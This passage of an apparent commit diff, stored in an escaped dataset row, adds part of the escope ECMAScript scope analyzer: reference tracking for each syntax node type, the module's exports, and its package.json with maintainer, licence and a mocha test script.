Syntax.Literal:<\n>+                    break;<\n>+                case Syntax.LabeledStatement:<\n>+                    break;<\n>+                case Syntax.LogicalExpression:<\n>+                    scope.__referencing(node.left);<\n>+                    scope.__referencing(node.right);<\n>+                    break;<\n>+                case Syntax.MemberExpression:<\n>+                    scope.__referencing(node.object);<\n>+                    if (node.computed) {<\n>+                        scope.__referencing(node.property);<\n>+                    }<\n>+                    break;<\n>+                case Syntax.NewExpression:<\n>+                    scope.__referencing(node.callee);<\n>+                    for (i = 0<c> iz = node['arguments'].length; i < iz; ++i) {<\n>+                        scope.__referencing(node['arguments'][i]);<\n>+                    }<\n>+                    break;<\n>+                case Syntax.ObjectExpression:<\n>+                    break;<\n>+                case Syntax.Program:<\n>+                    break;<\n>+                case Syntax.Property:<\n>+                    scope.__referencing(node.value);<\n>+                    break;<\n>+                case Syntax.ReturnStatement:<\n>+                    scope.__referencing(node.argument);<\n>+                    break;<\n>+                case Syntax.SequenceExpression:<\n>+                    for (i = 0<c> iz = node.expressions.length; i < iz; ++i) {<\n>+                        scope.__referencing(node.expressions[i]);<\n>+                    }<\n>+                    break;<\n>+                case Syntax.SwitchStatement:<\n>+                    scope.__referencing(node.discriminant);<\n>+                    break;<\n>+                case Syntax.SwitchCase:<\n>+                    scope.__referencing(node.test);<\n>+                    break;<\n>+                case Syntax.ThisExpression:<\n>+                    break;<\n>+                case Syntax.ThrowStatement:<\n>+                    scope.__referencing(node.argument);<\n>+                    break;<\n>+                case Syntax.TryStatement:<\n>+                    break;<\n>+                case Syntax.UnaryExpression:<\n>+                    scope.__referencing(node.argument);<\n>+                    break;<\n>+                case Syntax.UpdateExpression:<\n>+                    scope.__referencing(node.argument);<\n>+                    break;<\n>+                case Syntax.VariableDeclaration:<\n>+                    break;<\n>+                case Syntax.VariableDeclarator:<\n>+                    scope.variableScope.__define(node.id);<\n>+                    scope.__referencing(node.init);<\n>+                    break;<\n>+                case Syntax.WhileStatement:<\n>+                    scope.__referencing(node.test);<\n>+                    break;<\n>+                case Syntax.WithStatement:<\n>+                    scope.__referencing(node.object);<\n>+                    break;<\n>+                }<\n>+            }<c><\n>+            leave: function leave(node) {<\n>+                while (scope && node === scope.block) {<\n>+                    scope.__close();<\n>+                }<\n>+            }<\n>+        });<\n>+        assert(scope === null);<\n>+        return new ScopeManager(scopes);<\n>+    };<\n>+    exports.version = VERSION;<\n>+    exports.Reference = Reference;<\n>+    exports.Variable = Variable;<\n>+    exports.Scope = Scope;<\n>+    exports.ScopeManager = ScopeManager;<\n>+    exports.analyze = analyze;<\n>+/* vim: set sw=4 ts=4 et tw=80 : */<\n>+    ""name"": ""escope""<c><\n>+    ""description"": ""ECMAScript scope analyzer""<c><\n>+    ""homepage"": ""http://github.com/Constellation/escope.html""<c><\n>+    ""main"": ""escope.js""<c><\n>+    ""version"": ""0.0.1-dev""<c><\n>+    ""engines"": {<\n>+        ""node"": "">=0.4.0""<\n>+    }<c><\n>+    ""maintainers"": [{<\n>+        ""name"": ""Yusuke Suzuki""<c><\n>+        ""email"": ""utatane.tea@gmail.com""<c><\n>+        ""web"": ""http://github.com/Constellation""<\n>+    }]<c><\n>+    ""repository"": {<\n>+        ""type"": ""git""<c><\n>+        ""url"": ""http://github.com/Constellation/escope.git""<\n>+    }<c><\n>+    ""devDependencies"": {<\n>+        ""mocha"": ""*""<c><\n>+        ""chai"": ""*""<\n>+    }<c><\n>+    ""licenses"": [{<\n>+        ""type"": ""BSD""<c><\n>+        ""url"": ""http://github.com/Constellation/escope/raw/master/LICENSE.BSD""<\n>+    }]<c><\n>+    ""scripts"": {<\n>+        ""test"": ""./node_modules/.bin/mocha""<\n>+    }<\n>",,F
